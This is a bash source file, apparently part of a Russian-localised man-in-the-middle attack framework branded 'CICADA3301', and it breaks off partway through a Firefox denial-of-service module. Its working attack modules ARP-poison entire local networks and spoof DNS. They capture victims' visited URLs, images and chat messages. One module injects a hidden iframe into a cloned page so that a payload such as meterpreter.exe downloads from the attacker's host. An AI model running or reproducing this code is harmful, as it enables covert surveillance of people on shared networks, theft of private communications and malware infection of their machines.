# -----------------------------------------
sh_stage4 () {
echo ""
echo "${BlueF}    ╔─────────────────────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   Этот модуль попросит пользователя ввести доменное имя для перенаправления${BlueF}|"
echo "${BlueF}    | ${YellowF}     все браузерные серфингисты в целевом для выбранного домена.            ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'Все домены [.com] будут перенаправлены на адрес подмены'                ${BlueF}|"
echo "${BlueF}    ╚─────────────────────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP / IP Bednakov-Xack-Live" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
fil_one=$(zenity --title="☠ ДОМЕН В СПУФ ☠" --text "пример: 31.192.120.44 \ВНИМАНИЕ: следующее значение должно быть десятичным..." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
  cd $IPATH
  sleep 1

# compiling redirect.eft to be used in ettercap
xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} составление redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/redirect.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------------
# REDIRECT TARGET TRAFIC TO GOOGLE SPHERE (prank)
# -----------------------------------------------
sh_stage5 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}      Этот модуль будет перенаправлять целевой браузерr         ${BlueF}|"
echo "${BlueF}    | ${YellowF}       Mitm-атаки на сайт сферы Google (Google Prank)           ${BlueF}|"
echo "${BlueF}    | ${YellowF}      'Все домены [.com] будут перенаправлены на mrdoob.com'    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP / IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
  # copy files needed to apache2 webroot...
  cp -R $IPATH/bin/phishing/"Google Sphere_files" $ApachE > /dev/null 2>&1
  cp $IPATH/bin/phishing/index.html $ApachE > /dev/null 2>&1
  cd $IPATH
  sleep 1

# compiling packet_drop.eft to be used in ettercap
xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} составление redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/redirect.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
  rm -R $ApachE/"Google Sphere_files" > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -----------------------------------------------
# CAPTURE TARGET BROWSING HISTORY [URL's VISITED]
# -----------------------------------------------
sh_stage6 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}  Этот модуль будет захватывать целевой браузерный серфинг [URL-адрес посещен]  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  и затем отобразить с помощью urlsnarf, этот модуль будет                      ${BlueF}|"
echo "${BlueF}    | ${YellowF}    также хранить URL-адреса посещенных в morpheus/logs/grab_hosts.log          ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Hacking ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


ch=`which urlsnarf`
if [ "$ch" != "$UsNar" ]; then
echo ${RedF}[x]${white} msgsnarf utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/filters/grab_hosts.eft $IPATH/filters/grab_hosts.rb > /dev/null 2>&1 # backup
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} составление grab_hosts.eft${RedF}!${Reset};
  xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Пожалуйста, подождите, захваттрафик ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        xterm -T "захват просмотра [нажмите Ctrl + C для выхода]" -geometry 120x27 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        xterm -T "захват просмотра [нажмите Ctrl + C для выхода]" -geometry 120x27 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/
      fi


  # check if exist any reports
  dd=`ls $IPATH/logs`
  cd $IPATH/logs
  tr -cd '\11\12\15\40-\176' < grab_hosts.log > clean-file.log # remove non-ancii caracters
  mv clean-file.log grab_hosts.log > /dev/null 2>&1
  if ! [ -z "$dd" ]; then
  # display captured brosing hitory to user
  HoSt=`cat $IPATH/logs/grab_hosts.log | grep "Host:"` > /dev/null 2>&1
  echo ""
  echo "${white}Host:${YellowF} $UpL ${white}browsing history${RedF}!"
  echo "$HoSt"
  Qu=$(zenity --info --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы $IPATH/logs" --width 270) > /dev/null 2>&1
  fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# -------------------------------------------
# CAPTURE TARGET BROWSING PICTURES (DRIFTNET)
# -------------------------------------------
sh_stage7 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Этот модуль позволит пользователям захватывать изображения с целиt    ${BlueF}|"
echo "${BlueF}    | ${YellowF}          сетевой трафик и отображать их в окне X.                        ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                          ${BlueF}|"
echo "${BlueF}    | ${YellowF} СОВЕТ: morpheus сохранит захваченные изображения в журналы/захват        ${BlueF}|"
echo "${BlueF}    | ${YellowF}  но это в конечном итоге удалит содержимое папки захвата.                ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы ?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


ch=`which driftnet`
if [ "$ch" != "$DrIn" ]; then
echo ${RedF}[x]${white} driftnet utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}driftnet${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'CICADA3301 Настройки отравления арп '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'CICADA3301 Настройки отравления арп '\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\chose target to filter through CICADA3301." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  mkdir $IPATH/logs/capture > /dev/null 2>&1
  sleep 1
  echo ${BlueF}[☠]${white} Folder: logs/capture build${RedF}!${Reset};
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        driftnet -i $InT3R -d capture & ettercap -T --visual text -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        driftnet -i $InT3R -d capture & ettercap -T --visual text -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  rm -r $IPATH/logs/capture > /dev/null 2>&1
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}







# -----------------------------------------------------
# CAPTURE TARGET CHAT CONVERSATIONS [IRC,AOL,YAHOO,MSN]
# -----------------------------------------------------
sh_stage8 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} Этот модуль будет захватывать целевые чаты в реальном времени                           ${BlueF}|"
echo "${BlueF}    | ${YellowF} IRC, AOL, YAHOO, MSN, POP3 с использованием msgsnarf в качестве внутреннего приложения  ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


ch=`which msgsnarf`
if [ "$ch" != "$MsGnA" ]; then
echo ${RedF}[x]${white} msgsnarf utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
rm $IPATH/logs/chat_services.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'CICADA3301 Настройки отравления арп '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'CICADA3301 Настройки отравления арп '\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/filters/chat_services.eft $IPATH/filters/chat_services.rb > /dev/null 2>&1 # backup
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/chat_services.eft > /dev/null 2>&1
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} составление chat_services.eft${RedF}!${Reset};
  xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/chat_services.eft -o $IPATH/output/chat_services.ef && sleep 3"
  sleep 1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
      echo ${RedF}  # webspy -i $InT3R $UpL
        xterm -T "захват чата / сообщения [нажмите ctrl + c для выхода]" -geometry 120x27 -e "msgsnarf -i $InT3R $UpL" & ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/chat_services.ef -M ARP /$rhost// /$gateway//
      else
      echo ${RedF}
        xterm -T "захват чата / сообщения [нажмите ctrl + c для выхода]" -geometry 120x27 -e "msgsnarf -i $InT3R $UpL" & ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/chat_services.ef -M ARP /$rhost/ /$gateway/
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1 # backup
  rm $IPATH/output/chat_services.ef > /dev/null 2>&1
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# --------------------------------------------------------
# CLONE WEBSITE AND INJECT BACKDOOR ON </BODY><IFRAME> TAG
# --------------------------------------------------------
sh_stage9 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Этот модуль встроит вашу полезную информацию в фальшивую веб-страницу    ${BlueF}|"
echo "${BlueF}    | ${YellowF}     и доставляет его с помощью mitm + dns_spoof (триггер загрузки)      ${BlueF}|"
echo "${BlueF}    | ${YellowF}    'Все домены [.com] будут перенаправлены на фальшивую веб-страницу'   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title "☠ ЗАГРУЗИТЬ, ЧТОБЫ ЗАГРУЗИТЬ ☠" --filename=$IPATH --file-selection --text "выбрал полезную нагрузку, чтобы быть uploded\nexample:meterpreter.exe") > /dev/null 2>&1

echo ${BlueF}[☠]${white} Parsing agent filename data ..${Reset};
sleep 2
echo "$UpL" > test.txt
dIc=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1 # payload.exe
rm test.txt > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  # using bash SED to inject our malicious <iframe>
  cd phishing
  sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > clone2.html
  # copy files to apache2 webroot
  mv clone2.html $ApachE/index.html > /dev/null 2>&1
  cp miss.png $ApachE > /dev/null 2>&1
  cp $UpL $ApachE > /dev/null 2>&1
  rm clone2.html > /dev/null 2>&1
  cd ..
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1


# IF NOT EXIST FILE IN APACHE, ABORT..
if ! [ -e $ApachE/$dIc ]; then
echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
sleep 3
cd $ApachE
rm *.exe
rm $ApachE/miss.png > /dev/null 2>&1
cd $IPATH
sh_exit # jump to exit ...
fi

echo ${BlueF}[☠]${white} Found:${GreenF}$dIc${RedF}!${Reset};
sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  rm $ApachE/miss.png > /dev/null 2>&1
  rm $ApachE/$dIc > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------------------------------------
# FIREFOX =< 49.0.1 DENIAL-OF-SERVICE [mitm+dns_spoof]
# ----------------------------------------------------
sh_stage10 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF} Этот модуль аварийно завершит работу Mozilla Firefox (= <49.0.1), используя  ${BlueF}|"
echo "${BlueF}    | ${YellowF} Heap Spray, написанный на javascript (поставьте под mitm + dns_spoof) ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'Все домены [.com] будут перенаправлены на веб-страницу эксплойтов.'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  1 - Захват пакета tcp/udp от целевого хоста для проверки уязвимости    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  2 - Если версия Firefox его эксплуатируемая, то доставьте полезную нагрузку.    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
  # copy files to apache2 webroot
  cp $IPATH/bin/phishing/Firefox-D0S-49.0.1.html $ApachE/index.html > /dev/null 2>&1
  # use SED bash command
  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1

  # compiling UserAgent.eft to be used in ettercap
  echo ${BlueF}[☠]${white} составление UserAgent.eft${RedF}!${Reset};
  xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
